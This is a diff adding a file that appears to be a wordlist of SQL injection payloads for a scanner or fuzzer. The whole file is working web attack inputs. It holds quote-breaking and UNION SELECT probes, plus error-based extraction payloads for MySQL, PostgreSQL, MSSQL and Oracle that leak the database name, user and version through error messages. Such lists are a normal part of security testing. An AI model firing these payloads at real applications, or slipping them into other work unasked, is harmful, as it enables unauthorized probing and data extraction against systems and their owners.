@@ -1,0 +1,39 @@
+'
+"
+\
+' union select 1 -- a
+' union select 1,2 -- a
+" union select 1 -- a
+union select 1 -- a
+' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
+' union select abc,xyz -- -
+' OR 1=CAST((SELECT 1) AS INT) -- -
+' AND EXTRACTVALUE(1, CONCAT(0x7e, DATABASE(), 0x7e)) -- -
+' AND UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 1) -- -
+' AND GTID_SUBSET(CONCAT(0x7e, VERSION(), 0x7e), 1) -- -
+' AND JSON_KEYS((SELECT CONVERT((SELECT @@version) USING utf8))) -- -
+' AND 1=(SELECT 1/0) -- -
+' AND 1=CAST('a' AS INT) -- -
+' AND 1=CONVERT(INT, 'abc') -- -
+' AND 1=TO_NUMBER((SELECT banner FROM v$version WHERE ROWNUM=1)) --
+' AND 1=(SELECT TO_NUMBER('abc') FROM dual) --
+1 AND 1=(SELECT 1/0)
+' AND 1=(SELECT 1/0) -- -
+" AND 1=(SELECT 1/0) -- -
+1 AND 1=CAST('a' AS INT)
+' AND 1=CAST('a' AS INT) -- -
+" AND 1=CAST('a' AS INT) -- -
+1 AND EXTRACTVALUE(1, CONCAT(0x7e, DATABASE(), 0x7e))
+' AND EXTRACTVALUE(1, CONCAT(0x7e, DATABASE(), 0x7e)) -- -
+" AND EXTRACTVALUE(1, CONCAT(0x7e, DATABASE(), 0x7e)) -- -
+1 AND UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 1)
+' AND UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 1) -- -
+" AND UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 1) -- -
+1 AND GTID_SUBSET(CONCAT(0x7e, VERSION(), 0x7e), 1)
+' AND GTID_SUBSET(CONCAT(0x7e, VERSION(), 0x7e), 1) -- -
+1 AND CAST((SELECT version()) AS INTEGER) IS NULL
+' AND CAST((SELECT version()) AS INTEGER) IS NULL -- -
+1 AND 1=CONVERT(INT, @@version)
+' AND 1=CONVERT(INT, @@version) -- -
+1 AND 1=TO_NUMBER('abc')
+' AND 1=TO_NUMBER('abc') -- -
